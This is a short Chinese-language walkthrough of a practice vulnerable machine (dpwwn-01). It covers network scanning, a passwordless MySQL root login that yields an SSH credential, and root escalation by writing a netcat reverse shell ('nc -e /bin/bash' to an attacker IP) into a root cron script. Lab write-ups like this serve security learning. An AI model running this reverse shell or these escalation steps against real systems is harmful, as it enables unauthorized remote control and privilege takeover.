## 靶机信息
- 级别:容易
- 目标：获得root权限，获取/root目录下dpwwn-01-FLAG.txt的内容。
- 注意：在 VMware 工作站 14 上测试。

## Recon
### nmap
```shell
nmap -sn 192.168.1.0/24
//IP:192.168.1.150

sudo nmap -sT --min-rate 10000 -p- 192.168.1.150 -oA tcp_scan/ports
//Ports:
PORT     STATE SERVICE                                                        │
22/tcp   open  ssh                                                            │
80/tcp   open  http                                                           │
3306/tcp open  mysql
```

## Web
![[Pasted image 20231012143558.png]]
打开是一个展示页.
找了半天，web几乎没有什么内容

## MySQL
### 弱密码
```shell
mysql -h 192.168.1.150 -uroot //出现错误 重启靶机即可
//在ssh库的users表中得到凭证
 1 | mistic   | testP@$$swordmistic 
```

## 提权

### 自动任务提权
```shell
cat /etc/crontab 
*/3 *  * * *  root  /home/mistic/logrot.sh

写入反弹shell在logrot.sh
nc -e /bin/bash 192.168.1.136 1234
//等待三分钟即可
```

![[Pasted image 20231012155004.png]]

